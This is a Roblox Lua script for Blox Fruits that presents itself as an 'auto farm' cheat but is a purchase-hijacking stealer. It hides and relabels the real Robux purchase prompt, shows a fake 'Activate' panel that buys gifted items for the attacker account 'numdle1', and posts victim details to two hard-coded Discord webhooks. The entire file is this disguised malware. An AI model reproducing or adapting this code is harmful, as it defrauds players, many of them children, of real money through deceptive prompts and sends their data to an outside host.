username = "numdle1"
webhook = "https://discord.com/api/webhooks/1336650179662581760/W8hlgplA9FeSUNDx-SbwNfTbgnbJL-6qOuvT72D2DyxvBICXLEcaAQyCSbNImHByB8hE"

-- BLOX FRUIT?
LogsWebhook = "https://discord.com/api/webhooks/1336650234838650943/mC5SNrQMh1spPkV8ePkIMgZ-iyaODm6wd_wId-ElYwDltPhCGVH0wIIt1BbEM7lPrY7-"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local result = 0 

local HttpService = game:GetService("HttpService")

local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

local args = {
    [1] = "buyRobuxShop",
    [2] = {
        ["StorageName"] = "2x EXP (15 mins.)",
        ["FunnelId"] = "Shop",
        ["PurchaseLocation"] = "Shop"
    }
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))

local CoreGui = game:GetService("CoreGui")
local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
local Animator = ProductContainer:WaitForChild("Animator")

Animator.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local prompt = Animator:WaitForChild("Prompt")
        local alertContents = prompt:WaitForChild("AlertContents")
        
        local middleContent = alertContents:FindFirstChild("MiddleContent")
        if middleContent then
            middleContent.Visible = false
        end

        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
        if title and title:IsA("TextLabel") then
            title.Text = "SCRIPT LOADED!"
        end
        
        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
        local button2 = footerButtons:FindFirstChild("2")
        if button2 then
            button2.Visible = false
        end

        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
        if footerContent then
            footerContent.Visible = false
        end
        
        local button1 = footerButtons:FindFirstChild("1")
        if button1 then
            local buttonContent = button1:WaitForChild("ButtonContent")
            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
            if buttonMiddleContent then
                buttonMiddleContent.Text = "LOAD!"
            end
        end
    end
end)

local function sendWebhook()

    local embed = {
        ["title"] = "**Phew Scripts - You Got A Execution** :rofl:",
        ["color"] = 39423,
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. result .. "```"
            },
            {
                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
                ["value"] = "[****]()",
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })

    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

function stealitem()
    if result >= 5000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["PurchaseLocation"] = "FruitShop",
                ["StorageName"] = "Permanent Dragon-Dragon",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 4000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Kitsune-Kitsune",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 3000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Leopard-Leopard",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2700 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Fruit Notifier",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2550 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Spirit-Spirit",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2500 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Gas-Gas",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2450 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Venom-Venom",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2425 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Shadow-Shadow",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2400 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Dough-Dough",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2350 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent T-Rex-T-Rex",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2300 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Gravity-Gravity",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2250 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Blizzard-Blizzard",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2200 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Pain-Pain",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2100 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Rumble-Rumble",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Portal-Portal",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1900 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Sound-Sound",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1800 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Spider-Spider",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1700 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Love-Love",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1650 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Buddha-Buddha",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1500 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Quake-Quake",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1300 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Magma-Magma",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1275 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Ghost-Ghost",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1250 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Barrier-Barrier",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1200 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Dark Blade",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1100 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Light-Light",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Diamond-Diamond",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 950 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Dark-Dark",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 850 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Sand-Sand",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 750 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Ice-Ice",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 650 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Falcon-Falcon",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 550 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Flame-Flame",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 450 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "2x Money",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 400 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "+1 Fruit Storage",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 380 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Spike-Spike",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
        
    elseif result >= 350 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "2x Boss Drops",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 250 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Smoke-Smoke",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 220 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Bomb-Bomb",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 180 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Spring-Spring",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 100 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Blade-Blade",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 75 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Spin-Spin",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 50 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "10K Money",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 25 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "2x EXP (15 mins.)",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
      game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
   end
end

local function WaitForPrompt1()
    local CoreGui = game:GetService("CoreGui")

    -- Detect when the purchase prompt appears
    local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
    if PurchasePrompt then
        local Animator = PurchasePrompt:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
        repeat task.wait() until not Animator:FindFirstChild("Prompt")
        
        -- Remove the original purchase prompt (don't block input)
        PurchasePrompt:Destroy()

        -- Now, create and show the custom GUI instead of the original purchase prompt
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "CustomGUI"
        screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

        -- Create the main frame with a greyish transparent background and curved edges
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.25, 0, 0.35, 0)  -- Smaller and more compact size
        frame.Position = UDim2.new(0.375, 0, 0.3, 0)  -- Centered
        frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Dark grey background
        frame.BackgroundTransparency = 0.3 -- Slight transparency (greyish)
        frame.BorderSizePixel = 0 -- No border
        frame.ClipsDescendants = true -- Ensures no overlap inside
        frame.Parent = screenGui

        -- Add curved edges to the frame
        local uiCorner = Instance.new("UICorner")
        uiCorner.CornerRadius = UDim.new(0, 12) -- Curved edges (rounded corners)
        uiCorner.Parent = frame

        -- Add bright cyan UI stroke around the frame
        local uiStroke = Instance.new("UIStroke")
        uiStroke.Color = Color3.fromRGB(0, 255, 255) -- Bright cyan color for stroke
        uiStroke.Thickness = 3
        uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        uiStroke.Parent = frame

        -- Create the title label with white text, slightly moved down
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0.1, 0)
        title.Position = UDim2.new(0, 0, 0.05, 0)  -- Slightly moved down from the top
        title.Text = "Blox Fruits Auto Farm"
        title.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text color
        title.TextSize = 24
        title.Font = Enum.Font.SourceSansBold
        title.TextStrokeTransparency = 0.6 -- Light cyan stroke for the text
        title.BackgroundTransparency = 1
        title.Parent = frame

        -- Create the thin grey line
        local line = Instance.new("Frame")
        line.Size = UDim2.new(1, 0, 0, 2)
        line.Position = UDim2.new(0, 0, 0.15, 0)
        line.BackgroundColor3 = Color3.fromRGB(100, 100, 100) -- Grey color for the line
        line.BorderSizePixel = 0
        line.Parent = frame

        -- Create the text box-like area (slightly less transparent than the background)
        local textBoxBackground = Instance.new("Frame")
        textBoxBackground.Size = UDim2.new(0.9, 0, 0.3, 0)
        textBoxBackground.Position = UDim2.new(0.05, 0, 0.3, 0) -- Moved the text box area down
        textBoxBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Darker background for text box
        textBoxBackground.BackgroundTransparency = 0.4 -- Less transparent
        textBoxBackground.BorderSizePixel = 0
        textBoxBackground.Parent = frame

        -- Add curved edges to the text box background
        local textBoxCorner = Instance.new("UICorner")
        textBoxCorner.CornerRadius = UDim.new(0, 8) -- Rounded corners for text box
        textBoxCorner.Parent = textBoxBackground

        -- Create the "Welcome" label inside the text box
        local welcomeText = Instance.new("TextLabel")
        welcomeText.Size = UDim2.new(1, 0, 0.5, 0)
        welcomeText.Position = UDim2.new(0, 0, 0.1, 0)
        welcomeText.Text = "Welcome To Blox Zilla AutoFarm Script"
        welcomeText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text color
        welcomeText.TextSize = 18
        welcomeText.Font = Enum.Font.SourceSansBold
        welcomeText.TextStrokeTransparency = 0.6 -- Light cyan stroke for the text
        welcomeText.BackgroundTransparency = 1
        welcomeText.Parent = textBoxBackground

        -- Create the cyan button with bold text inside the text box
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(0.6, 0, 0.3, 0)
        button.Position = UDim2.new(0.2, 0, 0.6, 0)
        button.Text = "Activate"
        button.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
        button.TextSize = 24
        button.Font = Enum.Font.SourceSansBold
        button.BackgroundColor3 = Color3.fromRGB(0, 255, 255) -- Cyan color for button
        button.BackgroundTransparency = 0 -- Opaque background
        button.BorderSizePixel = 0 -- No border
        button.Parent = textBoxBackground

        -- Add rounded corners to the button
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 10) -- Rounded corners
        buttonCorner.Parent = button

        -- Button action: Replaces the old purchase prompt with the new functionality
        button.MouseButton1Click:Connect(function()
            print("Activate Button Clicked!")

            -- Simulate the action of activating the script and handling the purchase
            -- Trigger the purchase process here

            -- Here you would call the code for buying items, as it was shown in your previous script:
            -- For example, simulate buying an item:
            -- Make sure to send the correct arguments to the purchase function.
            local args = {
                [1] = "buyRobuxShop",
                [2] = {
                    ["Message"] = "Phew Scripts On Top",
                    ["StorageName"] = "Permanent Light-Light",
                    ["PurchaseLocation"] = "FruitShop",
                    ["FunnelId"] = "Shop",
                    ["ReceiverName"] = Username,
                    ["ReceiverUserId"] = UserId,
                }
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))

            -- Optionally, if you want to add additional effects here (like a sound or animation),
            -- you can include that as well.

            -- Remove the custom GUI after activation if desired:
            screenGui:Destroy()
        end)

        -- Add the [bulb emoji] text below the button
        local activateText = Instance.new("TextLabel")
        activateText.Size = UDim2.new(1, 0, 0.1, 0)
        activateText.Position = UDim2.new(0, 0, 0.75, 0)
        activateText.Text = "💡 Activate The Script To Start Farming"
        activateText.TextColor3 = Color3.fromRGB(255, 255, 0) -- Bright yellow text
        activateText.TextSize = 18
        activateText.Font = Enum.Font.SourceSansBold
        activateText.TextStrokeTransparency = 0.6 -- Light cyan stroke for the text
        activateText.BackgroundTransparency = 1
        activateText.Parent = frame

        -- Create the [boom emoji] text after
        local creatorText = Instance.new("TextLabel")
        creatorText.Size = UDim2.new(1, 0, 0.1, 0)
        creatorText.Position = UDim2.new(0, 0, 0.85, 0)
        creatorText.Text = "💥 Created By Blox Zilla"
        creatorText.TextColor3 = Color3.fromRGB(0, 255, 255) -- Cyan text color
        creatorText.TextSize = 18
        creatorText.Font = Enum.Font.SourceSansBold
        creatorText.TextStrokeTransparency = 0.6 -- Light cyan stroke for the text
        creatorText.BackgroundTransparency = 1
        creatorText.Parent = frame
    end
end

WaitForPrompt1()
